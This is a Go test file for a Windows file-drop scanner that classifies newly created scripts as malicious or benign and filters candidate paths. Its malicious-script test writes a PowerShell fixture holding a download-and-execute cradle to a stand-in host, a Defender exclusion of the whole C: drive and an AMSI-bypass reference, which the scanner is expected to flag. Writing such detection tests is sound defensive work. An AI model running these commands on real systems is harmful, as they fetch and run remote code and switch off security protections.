//go:build windows

package main

import (
	"os"
	"path/filepath"
	"testing"
	"time"
)

func newTestDropScanner() *dropScanner {
	return &dropScanner{ch: make(chan dropScanReq, 4), seen: map[string]time.Time{}, bySHA: map[string]map[string]any{}}
}

func TestDropScanMaliciousScript(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "stage.ps1")
	body := `$c=New-Object Net.WebClient; IEX($c.DownloadString('http://x/a')); ` +
		`[System.Convert]::FromBase64String('AAAA'); Add-MpPreference -ExclusionPath C:\; ` +
		`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`
	if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	s := newTestDropScanner()
	ev := s.scan(dropScanReq{path: p, source: map[string]any{"pid": 42}, etype: "file_create", at: time.Now()})
	if ev == nil {
		t.Fatal("expected a verdict event")
	}
	d := ev["detail"].(map[string]any)
	if d["verdict"] != "malicious" {
		t.Fatalf("verdict=%v score=%v reasons=%v", d["verdict"], d["score"], d["reasons"])
	}
	if d["pid"] != 42 || d["sha256"] == "" {
		t.Fatalf("missing context: %v", d)
	}
	if again := s.scan(dropScanReq{path: p, etype: "file_create", at: time.Now()}); again != nil {
		t.Fatal("same file should be deduplicated")
	}
}

func TestDropScanBenignScriptIsClean(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "hello.bat")
	if err := os.WriteFile(p, []byte("@echo off\r\necho hello\r\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if ev := newTestDropScanner().scan(dropScanReq{path: p, etype: "fim_add", at: time.Now()}); ev != nil {
		t.Fatalf("benign script should not emit: %v", ev["detail"])
	}
}

func TestDropScanCandidateFilter(t *testing.T) {
	cases := []struct {
		ev   map[string]any
		want bool
	}{
		{map[string]any{"etype": "file_create", "detail": map[string]any{"path": `C:\Users\a\Downloads\x.exe`}}, true},
		{map[string]any{"etype": "file_create", "detail": map[string]any{"path": `C:\Windows\System32\x.dll`}}, false},
		{map[string]any{"etype": "file_create", "detail": map[string]any{"path": `C:\Users\a\Downloads\x.txt`}}, false},
		{map[string]any{"etype": "process_create", "detail": map[string]any{"path": `C:\Users\a\Downloads\x.exe`}}, false},
	}
	for i, c := range cases {
		if _, got := dropScanCandidate(c.ev); got != c.want {
			t.Errorf("case %d: got %v want %v", i, got, c.want)
		}
	}
}
